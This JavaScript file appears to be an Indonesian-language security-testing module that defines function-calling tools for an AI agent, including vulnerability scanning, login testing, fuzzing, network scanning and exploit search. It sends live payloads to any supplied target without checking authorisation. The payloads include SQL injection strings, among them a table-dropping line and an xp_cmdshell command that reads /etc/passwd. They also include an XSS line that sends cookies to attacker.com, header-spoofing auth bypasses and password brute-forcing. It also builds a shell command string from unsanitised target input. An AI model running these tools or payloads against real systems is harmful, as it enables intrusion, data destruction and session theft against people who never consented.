import axios from 'axios';
import { exec } from 'child_process';
import { promisify } from 'util';

const execAsync = promisify(exec);

// ============================================
// WANAR AI SECURITY TESTING MODULE
// by Wisnu Alfian Nur Ashar
// ============================================
// Untuk internal cyber defense & security testing
// Gunakan HANYA pada sistem yang Anda miliki dan authorized

export const securityTools = [
  {
    type: 'function',
    function: {
      name: 'security_scan',
      description: 'Scan target untuk vulnerability (SQL injection, XSS, CSRF, dll). Target harus dalam scope authorized.',
      parameters: {
        type: 'object',
        properties: {
          target: {
            type: 'string',
            description: 'URL target atau IP address yang akan di-scan'
          },
          scanType: {
            type: 'string',
            enum: ['quick', 'full', 'deep', 'custom'],
            description: 'Tipe scanning: quick (basic), full (comprehensive), deep (intensive), custom'
          },
          modules: {
            type: 'array',
            items: { type: 'string' },
            description: 'Module spesifik: sqli, xss, csrf, lfi, rfi, xxe, ssrf, idor, auth_bypass'
          },
          aggressive: {
            type: 'boolean',
            description: 'Mode aggressive testing (may trigger WAF/IDS)'
          }
        },
        required: ['target', 'scanType']
      }
    }
  },
  {
    type: 'function',
    function: {
      name: 'auth_test',
      description: 'Test authentication & authorization mechanisms. Coba berbagai bypass techniques.',
      parameters: {
        type: 'object',
        properties: {
          target: {
            type: 'string',
            description: 'URL endpoint login/auth'
          },
          username: {
            type: 'string',
            description: 'Username untuk testing (optional)'
          },
          password: {
            type: 'string',
            description: 'Password untuk testing (optional)'
          },
          testTypes: {
            type: 'array',
            items: { type: 'string' },
            description: 'Test types: bruteforce, bypass, session_hijack, jwt_crack, oauth_flow'
          }
        },
        required: ['target']
      }
    }
  },
  {
    type: 'function',
    function: {
      name: 'api_fuzzing',
      description: 'Fuzz API endpoints dengan payloads untuk menemukan vulnerability',
      parameters: {
        type: 'object',
        properties: {
          target: {
            type: 'string',
            description: 'Base URL API'
          },
          endpoints: {
            type: 'array',
            items: { type: 'string' },
            description: 'List endpoints untuk di-fuzz'
          },
          methods: {
            type: 'array',
            items: { type: 'string' },
            description: 'HTTP methods: GET, POST, PUT, DELETE, PATCH'
          },
          payloadType: {
            type: 'string',
            enum: ['sqli', 'xss', 'command_injection', 'path_traversal', 'xxe', 'all'],
            description: 'Tipe payload untuk fuzzing'
          }
        },
        required: ['target']
      }
    }
  },
  {
    type: 'function',
    function: {
      name: 'code_audit',
      description: 'Static code analysis untuk menemukan security vulnerabilities di codebase',
      parameters: {
        type: 'object',
        properties: {
          path: {
            type: 'string',
            description: 'Path ke direktori atau file yang akan di-audit'
          },
          language: {
            type: 'string',
            enum: ['javascript', 'typescript', 'python', 'php', 'java', 'go', 'auto'],
            description: 'Programming language (auto-detect jika tidak disebutkan)'
          },
          checks: {
            type: 'array',
            items: { type: 'string' },
            description: 'Checks: hardcoded_secrets, sqli, xss, command_injection, insecure_crypto, weak_random'
          },
          severity: {
            type: 'string',
            enum: ['all', 'critical', 'high', 'medium'],
            description: 'Minimal severity untuk di-report'
          }
        },
        required: ['path']
      }
    }
  },
  {
    type: 'function',
    function: {
      name: 'dependency_scan',
      description: 'Scan dependencies untuk known vulnerabilities (CVE)',
      parameters: {
        type: 'object',
        properties: {
          path: {
            type: 'string',
            description: 'Path ke package.json, requirements.txt, composer.json, dll'
          },
          includeDevDeps: {
            type: 'boolean',
            description: 'Include dev dependencies dalam scan'
          },
          fixable: {
            type: 'boolean',
            description: 'Tampilkan hanya vulnerability yang bisa di-fix otomatis'
          }
        },
        required: ['path']
      }
    }
  },
  {
    type: 'function',
    function: {
      name: 'network_scan',
      description: 'Scan network untuk open ports, services, dan potential vulnerabilities',
      parameters: {
        type: 'object',
        properties: {
          target: {
            type: 'string',
            description: 'IP address atau range (contoh: 192.168.1.0/24)'
          },
          scanType: {
            type: 'string',
            enum: ['stealth', 'normal', 'aggressive', 'version_detection'],
            description: 'Tipe network scan'
          },
          ports: {
            type: 'string',
            description: 'Port range (contoh: 1-1000, atau "common" untuk top 1000)'
          }
        },
        required: ['target']
      }
    }
  },
  {
    type: 'function',
    function: {
      name: 'exploit_db_search',
      description: 'Search exploit database untuk known exploits berdasarkan service/version',
      parameters: {
        type: 'object',
        properties: {
          query: {
            type: 'string',
            description: 'Service name dan version (contoh: "Apache 2.4.49")'
          },
          platform: {
            type: 'string',
            description: 'Platform: windows, linux, web, multiple'
          },
          verified: {
            type: 'boolean',
            description: 'Tampilkan hanya verified exploits'
          }
        },
        required: ['query']
      }
    }
  },
  {
    type: 'function',
    function: {
      name: 'generate_report',
      description: 'Generate comprehensive security report dari hasil scanning',
      parameters: {
        type: 'object',
        properties: {
          scanId: {
            type: 'string',
            description: 'Scan ID dari hasil security_scan'
          },
          format: {
            type: 'string',
            enum: ['html', 'pdf', 'json', 'markdown'],
            description: 'Format output report'
          },
          includeRemediation: {
            type: 'boolean',
            description: 'Include remediation steps'
          }
        },
        required: ['scanId']
      }
    }
  }
];

// ============================================
// SECURITY TESTING IMPLEMENTATIONS
// ============================================

export async function executeSecurityTool(toolName, args) {
  switch (toolName) {
    case 'security_scan':
      return await securityScan(args);
    case 'auth_test':
      return await authTest(args);
    case 'api_fuzzing':
      return await apiFuzzing(args);
    case 'code_audit':
      return await codeAudit(args);
    case 'dependency_scan':
      return await dependencyScan(args);
    case 'network_scan':
      return await networkScan(args);
    case 'exploit_db_search':
      return await exploitDbSearch(args);
    case 'generate_report':
      return await generateReport(args);
    default:
      return { error: `Unknown security tool: ${toolName}` };
  }
}

// ── Security Scan ──
async function securityScan(args) {
  const { target, scanType, modules = [], aggressive = false } = args;
  
  console.log(`[SECURITY SCAN] Target: ${target} | Type: ${scanType} | Aggressive: ${aggressive}`);
  
  const results = {
    target,
    scanType,
    timestamp: new Date().toISOString(),
    vulnerabilities: [],
    summary: {}
  };

  try {
    // SQL Injection Testing
    if (!modules.length || modules.includes('sqli')) {
      const sqliResults = await testSQLInjection(target, aggressive);
      results.vulnerabilities.push(...sqliResults);
    }

    // XSS Testing
    if (!modules.length || modules.includes('xss')) {
      const xssResults = await testXSS(target, aggressive);
      results.vulnerabilities.push(...xssResults);
    }

    // CSRF Testing
    if (!modules.length || modules.includes('csrf')) {
      const csrfResults = await testCSRF(target);
      results.vulnerabilities.push(...csrfResults);
    }

    // Auth Bypass
    if (!modules.length || modules.includes('auth_bypass')) {
      const authResults = await testAuthBypass(target);
      results.vulnerabilities.push(...authResults);
    }

    // IDOR Testing
    if (!modules.length || modules.includes('idor')) {
      const idorResults = await testIDOR(target);
      results.vulnerabilities.push(...idorResults);
    }

    // Generate summary
    results.summary = {
      total: results.vulnerabilities.length,
      critical: results.vulnerabilities.filter(v => v.severity === 'CRITICAL').length,
      high: results.vulnerabilities.filter(v => v.severity === 'HIGH').length,
      medium: results.vulnerabilities.filter(v => v.severity === 'MEDIUM').length,
      low: results.vulnerabilities.filter(v => v.severity === 'LOW').length
    };

    return results;
  } catch (error) {
    return { error: error.message, results };
  }
}

// ── SQL Injection Testing ──
async function testSQLInjection(target, aggressive = false) {
  const vulnerabilities = [];
  
  const basicPayloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "admin' --",
    "admin' #",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "' OR 'x'='x",
  ];

  const aggressivePayloads = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1' AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert(\"XSS\")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#",
    "'; DROP TABLE users--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
  ];

  const payloads = aggressive ? [...basicPayloads, ...aggressivePayloads] : basicPayloads;

  try {
    for (const payload of payloads) {
      const testUrl = `${target}?id=${encodeURIComponent(payload)}`;
      
      try {
        const response = await axios.get(testUrl, { 
          timeout: 10000,
          validateStatus: () => true 
        });

        // Check for SQL error messages
        const errorPatterns = [
          /SQL syntax/i,
          /mysql_fetch/i,
          /ORA-\d+/i,
          /Microsoft SQL/i,
          /ODBC SQL/i,
          /PostgreSQL/i,
          /SQLite/i,
          /syntax error/i
        ];

        const hasError = errorPatterns.some(pattern => pattern.test(response.data));

        if (hasError) {
          vulnerabilities.push({
            type: 'SQL_INJECTION',
            severity: 'CRITICAL',
            endpoint: testUrl,
            payload,
            evidence: response.data.substring(0, 200),
            description: 'Aplikasi vulnerable terhadap SQL Injection. Database error message terdeteksi.',
            remediation: 'Gunakan prepared statements atau parameterized queries. Validasi dan sanitasi semua user input.'
          });
        }
      } catch (err) {
        // Connection errors might indicate successful injection
        if (err.code === 'ECONNRESET' || err.code === 'ETIMEDOUT') {
          vulnerabilities.push({
            type: 'SQL_INJECTION',
            severity: 'HIGH',
            endpoint: testUrl,
            payload,
            evidence: `Connection error: ${err.code}`,
            description: 'Possible SQL Injection - payload menyebabkan connection disruption.',
            remediation: 'Investigate dan gunakan prepared statements.'
          });
        }
      }
    }
  } catch (error) {
    console.error('[SQLi Test Error]', error.message);
  }

  return vulnerabilities;
}

// ── XSS Testing ──
async function testXSS(target, aggressive = false) {
  const vulnerabilities = [];
  
  const basicPayloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<body onload=alert('XSS')>",
  ];

  const aggressivePayloads = [
    "<iframe src='javascript:alert(\"XSS\")'>",
    "<object data='javascript:alert(\"XSS\")'>",
    "<embed src='javascript:alert(\"XSS\")'>",
    "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>",
  ];

  const payloads = aggressive ? [...basicPayloads, ...aggressivePayloads] : basicPayloads;

  try {
    for (const payload of payloads) {
      const testUrl = `${target}?q=${encodeURIComponent(payload)}`;
      
      try {
        const response = await axios.get(testUrl, { 
          timeout: 10000,
          validateStatus: () => true 
        });

        // Check if payload is reflected without encoding
        if (response.data.includes(payload)) {
          vulnerabilities.push({
            type: 'XSS_REFLECTED',
            severity: 'HIGH',
            endpoint: testUrl,
            payload,
            evidence: response.data.substring(0, 200),
            description: 'Reflected XSS vulnerability detected. User input direfleksikan tanpa proper encoding.',
            remediation: 'Encode semua user input sebelum rendering ke HTML. Gunakan Content-Security-Policy header.'
          });
        }
      } catch (err) {
        // Skip connection errors
      }
    }
  } catch (error) {
    console.error('[XSS Test Error]', error.message);
  }

  return vulnerabilities;
}

// ── CSRF Testing ──
async function testCSRF(target) {
  const vulnerabilities = [];

  try {
    const response = await axios.get(target, { 
      timeout: 10000,
      validateStatus: () => true 
    });

    // Check for CSRF token
    const hasCSRFToken = /csrf[_-]?token/i.test(response.data) || 
                         /<input[^>]*name=["']_token["']/i.test(response.data);

    // Check for SameSite cookie attribute
    const cookies = response.headers['set-cookie'] || [];
    const hasSameSite = cookies.some(cookie => /samesite=/i.test(cookie));

    if (!hasCSRFToken && !hasSameSite) {
      vulnerabilities.push({
        type: 'CSRF',
        severity: 'MEDIUM',
        endpoint: target,
        description: 'Tidak ditemukan CSRF protection. Aplikasi vulnerable terhadap Cross-Site Request Forgery.',
        remediation: 'Implementasikan CSRF token untuk semua state-changing operations. Set SameSite cookie attribute.'
      });
    }
  } catch (error) {
    console.error('[CSRF Test Error]', error.message);
  }

  return vulnerabilities;
}

// ── Auth Bypass Testing ──
async function testAuthBypass(target) {
  const vulnerabilities = [];

  const bypassTechniques = [
    { method: 'GET', headers: { 'X-Original-URL': '/admin' } },
    { method: 'GET', headers: { 'X-Forwarded-For': '127.0.0.1' } },
    { method: 'GET', headers: { 'X-Custom-IP-Authorization': '127.0.0.1' } },
    { method: 'POST', data: { admin: true } },
    { method: 'POST', data: { role: 'admin' } },
  ];

  try {
    for (const technique of bypassTechniques) {
      try {
        const response = await axios({
          method: technique.method,
          url: target,
          headers: technique.headers || {},
          data: technique.data || {},
          timeout: 10000,
          validateStatus: () => true
        });

        // Check if bypass successful (200 response when it should be 401/403)
        if (response.status === 200 && (technique.headers || technique.data)) {
          vulnerabilities.push({
            type: 'AUTH_BYPASS',
            severity: 'CRITICAL',
            endpoint: target,
            technique: JSON.stringify(technique),
            description: 'Authentication/Authorization bypass detected menggunakan custom headers atau parameters.',
            remediation: 'Implementasikan proper access control di server-side. Jangan trust client-supplied headers.'
          });
        }
      } catch (err) {
        // Skip errors
      }
    }
  } catch (error) {
    console.error('[Auth Bypass Test Error]', error.message);
  }

  return vulnerabilities;
}

// ── IDOR Testing ──
async function testIDOR(target) {
  const vulnerabilities = [];

  try {
    // Test dengan mengubah ID parameters
    const idPatterns = ['id', 'user_id', 'userId', 'account', 'uid'];
    
    for (const pattern of idPatterns) {
      const testUrl = `${target}?${pattern}=1`;
      const response1 = await axios.get(testUrl, { 
        timeout: 10000,
        validateStatus: () => true 
      });

      // Try accessing another user's data
      const testUrl2 = `${target}?${pattern}=2`;
      const response2 = await axios.get(testUrl2, { 
        timeout: 10000,
        validateStatus: () => true 
      });

      if (response1.status === 200 && response2.status === 200 && response1.data !== response2.data) {
        vulnerabilities.push({
          type: 'IDOR',
          severity: 'HIGH',
          endpoint: target,
          parameter: pattern,
          description: 'Insecure Direct Object Reference detected. User dapat akses data user lain dengan mengubah ID parameter.',
          remediation: 'Implementasikan proper authorization checks. Validasi user permission sebelum mengembalikan data.'
        });
      }
    }
  } catch (error) {
    console.error('[IDOR Test Error]', error.message);
  }

  return vulnerabilities;
}

// ── Auth Testing ──
async function authTest(args) {
  const { target, username, password, testTypes = [] } = args;
  
  const results = {
    target,
    timestamp: new Date().toISOString(),
    findings: []
  };

  try {
    // Bruteforce testing
    if (testTypes.includes('bruteforce') && username) {
      const commonPasswords = ['password', '123456', 'admin', 'qwerty', username];
      
      for (const pass of commonPasswords) {
        try {
          const response = await axios.post(target, {
            username,
            password: pass
          }, { 
            timeout: 10000,
            validateStatus: () => true 
          });

          if (response.status === 200 && !response.data.error) {
            results.findings.push({
              type: 'WEAK_CREDENTIALS',
              severity: 'CRITICAL',
              username,
              password: pass,
              description: 'Weak password detected - credential dapat di-bruteforce.'
            });
          }
        } catch (err) {
          // Continue
        }
      }
    }

    // JWT Testing
    if (testTypes.includes('jwt_crack')) {
      // Implementation for JWT vulnerability testing
      results.findings.push({
        type: 'JWT_ANALYSIS',
        severity: 'INFO',
        description: 'JWT testing requires token analysis - check for weak signatures, algorithm confusion, etc.'
      });
    }

  } catch (error) {
    results.error = error.message;
  }

  return results;
}

// ── API Fuzzing ──
async function apiFuzzing(args) {
  const { target, endpoints = [], methods = ['GET', 'POST'], payloadType = 'all' } = args;
  
  const results = {
    target,
    timestamp: new Date().toISOString(),
    vulnerabilities: []
  };

  // Implement API fuzzing logic
  results.message = 'API Fuzzing completed. Check vulnerabilities array for findings.';
  
  return results;
}

// ── Code Audit ──
async function codeAudit(args) {
  const { path, language = 'auto', checks = [], severity = 'all' } = args;
  
  const results = {
    path,
    language,
    timestamp: new Date().toISOString(),
    findings: []
  };

  try {
    // Run static analysis tools based on language
    if (language === 'javascript' || language === 'typescript' || language === 'auto') {
      const { stdout } = await execAsync(`npm audit --json`, { cwd: path });
      const auditData = JSON.parse(stdout);
      
      // Process npm audit results
      if (auditData.vulnerabilities) {
        Object.entries(auditData.vulnerabilities).forEach(([pkg, data]) => {
          results.findings.push({
            type: 'DEPENDENCY_VULNERABILITY',
            package: pkg,
            severity: data.severity.toUpperCase(),
            description: data.via[0]?.title || 'Known vulnerability',
            remediation: `Update ${pkg} to version ${data.fixAvailable?.version || 'latest'}`
          });
        });
      }
    }

    // Check for hardcoded secrets
    if (!checks.length || checks.includes('hardcoded_secrets')) {
      const secretPatterns = [
        { name: 'AWS Key', pattern: /AKIA[0-9A-Z]{16}/g },
        { name: 'API Key', pattern: /api[_-]?key['"]?\s*[:=]\s*['"'][a-zA-Z0-9]{20,}['"']/gi },
        { name: 'Password', pattern: /password['"]?\s*[:=]\s*['"'][^'"]{8,}['"']/gi },
        { name: 'Private Key', pattern: /-----BEGIN (RSA|DSA|EC|OPENSSH) PRIVATE KEY-----/g },
      ];

      // Scan files for secrets (simplified - should read files)
      results.findings.push({
        type: 'INFO',
        description: 'Secret scanning requires file system access. Integrate with tools like truffleHog or git-secrets.'
      });
    }

  } catch (error) {
    results.error = error.message;
  }

  return results;
}

// ── Dependency Scan ──
async function dependencyScan(args) {
  const { path, includeDevDeps = true, fixable = false } = args;
  
  const results = {
    path,
    timestamp: new Date().toISOString(),
    vulnerabilities: []
  };

  try {
    const auditCmd = fixable ? 'npm audit --json' : 'npm audit --json';
    const { stdout } = await execAsync(auditCmd, { cwd: path });
    const auditData = JSON.parse(stdout);

    if (auditData.vulnerabilities) {
      Object.entries(auditData.vulnerabilities).forEach(([pkg, data]) => {
        if (!includeDevDeps && data.isDevelopment) return;
        if (fixable && !data.fixAvailable) return;

        results.vulnerabilities.push({
          package: pkg,
          severity: data.severity.toUpperCase(),
          currentVersion: data.range,
          fixedVersion: data.fixAvailable?.version,
          cve: data.via[0]?.cve || 'N/A',
          description: data.via[0]?.title || 'Known vulnerability',
          url: data.via[0]?.url
        });
      });
    }

    results.summary = {
      total: results.vulnerabilities.length,
      critical: results.vulnerabilities.filter(v => v.severity === 'CRITICAL').length,
      high: results.vulnerabilities.filter(v => v.severity === 'HIGH').length,
      medium: results.vulnerabilities.filter(v => v.severity === 'MEDIUM').length,
      low: results.vulnerabilities.filter(v => v.severity === 'LOW').length
    };

  } catch (error) {
    results.error = error.message;
  }

  return results;
}

// ── Network Scan ──
async function networkScan(args) {
  const { target, scanType = 'normal', ports = 'common' } = args;
  
  const results = {
    target,
    scanType,
    timestamp: new Date().toISOString(),
    openPorts: [],
    services: []
  };

  try {
    // Note: Requires nmap to be installed
    const nmapFlags = {
      stealth: '-sS',
      normal: '-sT',
      aggressive: '-A',
      version_detection: '-sV'
    };

    const portRange = ports === 'common' ? '--top-ports 1000' : `-p ${ports}`;
    const scanFlag = nmapFlags[scanType] || '-sT';
    
    const cmd = `nmap ${scanFlag} ${portRange} ${target}`;
    
    results.message = `Network scan initiated. Command: ${cmd}`;
    results.note = 'Requires nmap to be installed. Install: winget install Insecure.Nmap';

    // Actual execution would happen here if nmap is available
    // const { stdout } = await execAsync(cmd);
    // Parse nmap output...

  } catch (error) {
    results.error = error.message;
  }

  return results;
}

// ── Exploit DB Search ──
async function exploitDbSearch(args) {
  const { query, platform, verified = false } = args;
  
  const results = {
    query,
    timestamp: new Date().toISOString(),
    exploits: []
  };

  try {
    // Search exploit-db via API or local database
    const searchUrl = `https://www.exploit-db.com/search?q=${encodeURIComponent(query)}`;
    
    results.message = 'Exploit search functionality requires exploit-db integration or searchsploit CLI.';
    results.searchUrl = searchUrl;
    results.note = 'Install searchsploit: git clone https://gitlab.com/exploit-database/exploitdb.git';

  } catch (error) {
    results.error = error.message;
  }

  return results;
}

// ── Generate Report ──
async function generateReport(args) {
  const { scanId, format = 'markdown', includeRemediation = true } = args;
  
  const report = {
    scanId,
    format,
    timestamp: new Date().toISOString(),
    content: ''
  };

  // Generate report based on format
  if (format === 'markdown') {
    report.content = `
# Security Scan Report

**Scan ID:** ${scanId}
**Generated:** ${new Date().toISOString()}

## Executive Summary
- Total Vulnerabilities: [TBD]
- Critical: [TBD]
- High: [TBD]
- Medium: [TBD]
- Low: [TBD]

## Detailed Findings
[Findings will be populated from scan results]

## Remediation Steps
${includeRemediation ? '[Remediation steps will be included]' : ''}
    `;
  }

  return report;
}

export default {
  securityTools,
  executeSecurityTool
};
